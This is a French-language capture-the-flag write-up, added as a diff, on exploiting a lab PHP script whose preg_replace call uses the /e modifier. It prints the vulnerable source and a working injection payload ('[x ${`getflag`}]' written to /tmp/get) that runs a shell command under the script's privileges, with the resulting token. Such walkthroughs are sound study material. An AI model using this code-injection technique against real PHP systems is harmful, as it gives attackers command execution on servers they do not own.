@@ -1,0 +1,56 @@
+## Methode pour trouver le flag ##
+/*
+*   Format:
+*   - Objectif
+*   commande
+*       -> resultat
+*/
+
+1 fichier + 1 executable: level06.php et level06
+
+- test l executable
+./level06
+    -> affiche une erreur au niveau du fichier php on s y interesse.
+
+- fichier php
+cat level06.php
+    ->
+    #!/usr/bin/php
+    <?php
+    function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+    function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+    $r = x($argv[1], $argv[2]); print $r;
+    ?>
+
+2 fonctions importantes: preg_replace et file_get_contents
+    - preg_replace(a, b, s) remplace toutes les occurences du pattern a par b dans s (pour le 1er par exemp . est remplace par x)
+    - file_get_contents recupere dans une string le contenu d un fichier
+
+-> on peut en conclure direct qu'on va creer un fichier pour lui passer en parallele.
+En fouillant aussi dans les expressions regulieres pour etudier les pattern, on remarque le '\e'  
+    -> le modifer tres puissant mais tres vulnerable aussi (source='https://stackoverflow.com/questions/16986331/can-someone-explain-the-e-regex-modifier')
+
+Contrairement à la source, il faut executer une commande du shell en tant flag06, en cherchant j'ai trouve qu en php on pouvait utiliser `` comme pour le shell
+
+Ainsi on commence à voir ce qu'il faut mettre dans le fichier /tmp/get 
+[x pour respecter le preg_replace /e
+[x `getflag`]
+
+
+- On tente une execution:
+echo '[ x `getflag`]' > /tmp/get; ./level06 /tmp/get
+    -> affiche `getflag` donc on est sur le bon chemin mais il ne fait qu afficher pour l instant, cherchons une façon d'executer la commande
+
+${`cmd`} permet de substituer la string au resultat de cmd.
+
+- on modifie l expression pour au il execute correctement:
+echo '[ x ${`getflag`}' > /tmp/get ; ./level06 /tmp/get
+    -> PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+       in /home/user/level06/level06.php(4) : regexp code on line 1
+
+
+Sources:
+    - https://www.php.net/manual/fr/language.operators.execution.php
+    - https://www.dcode.fr/analyseur-expression-rationnelle
+    - https://www.php.net/manual/fr/function.preg-replace.php
+    - manque source ${}
